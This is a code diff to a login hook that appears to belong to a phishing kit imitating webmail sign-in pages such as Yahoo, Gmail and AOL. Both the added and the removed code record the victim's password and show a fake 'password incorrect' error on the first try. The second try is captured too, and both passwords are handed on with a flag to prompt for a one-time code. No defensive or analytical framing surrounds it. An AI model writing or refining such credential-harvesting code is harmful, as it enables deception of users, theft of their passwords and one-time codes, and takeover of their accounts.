@@ -20,8 +20,6 @@ export const useLogin = (
     event.preventDefault();
     setIsLoading(true);
     setErrorMessage('');
-    let isFirstAttemptResult = false;
-    const isTwoStepFlow = formData?.provider; // Only 'Others' and default providers use the two-step flow.
 
     try {
       const email = formData?.email || emailRef.current?.value || '';
@@ -31,59 +29,42 @@ export const useLogin = (
         throw new Error('Please enter both email and password');
       }
 
-      // --- TWO-STEP AUTH FLOW (for 'Others' provider) ---
-      if (isTwoStepFlow) {
-        // This is the SECOND attempt in the two-step flow
-        if (firstAttemptPassword) {
-          if (firstAttemptPassword === password) {
-            throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
-          }
-
-          console.log('✅ Second attempt captured. Passing to App for OTP.');
-          const finalData = {
-            ...formData,
-            email,
-            firstAttemptPassword,
-            secondAttemptPassword: password,
-            timestamp: new Date().toISOString(),
-            isSecondAttempt: true, // Flag for App.tsx to trigger OTP
-          };
-
-          if (onLoginSuccess) {
-            onLoginSuccess(finalData);
-          }
-          return;
+      // This is the SECOND valid attempt.
+      if (firstAttemptPassword) {
+        if (firstAttemptPassword === password) {
+            throw new Error('Your account or password is incorrect. Please try again.');
         }
 
-        // This is the FIRST attempt in the two-step flow
-        console.log('🔒 First attempt captured (simulating invalid password)');
-        setFirstAttemptPassword(password);
-        isFirstAttemptResult = true;
-        throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
+        const finalData = {
+          ...formData,
+          email,
+          firstAttemptPassword,
+          secondAttemptPassword: password,
+          isSecondAttempt: true, // This flag is crucial
+        };
+
+        // Call the success handler passed from App.tsx
+        if (onLoginSuccess) {
+          onLoginSuccess(finalData);
+        }
+        
+        // Do not set loading to false here, App.tsx will handle it
+        return; // Stop execution
       }
 
-      // --- SINGLE-STEP AUTH FLOW (for Yahoo, Gmail, AOL, etc.) ---
-      console.log('✅ Single attempt captured. Finalizing data.');
-      const finalData = {
-        ...formData,
-        email,
-        password,
-        timestamp: new Date().toISOString(),
-      };
-      
-      if (onLoginSuccess) {
-        onLoginSuccess(finalData);
-      }
-      
+      // This is the FIRST attempt.
+      setFirstAttemptPassword(password);
+      throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
+
     } catch (error) {
       const errorMsg = error instanceof Error ? error.message : 'Login failed';
       setErrorMessage(errorMsg);
+      setIsLoading(false); // Stop loading on error
       if (onLoginError) {
         onLoginError(errorMsg);
       }
-      return { isFirstAttempt: isFirstAttemptResult };
-    } finally {
-      setIsLoading(false);
+      // Return a flag so the UI can clear the password field
+      return { isFirstAttempt: !!firstAttemptPassword };
     }
   };
 
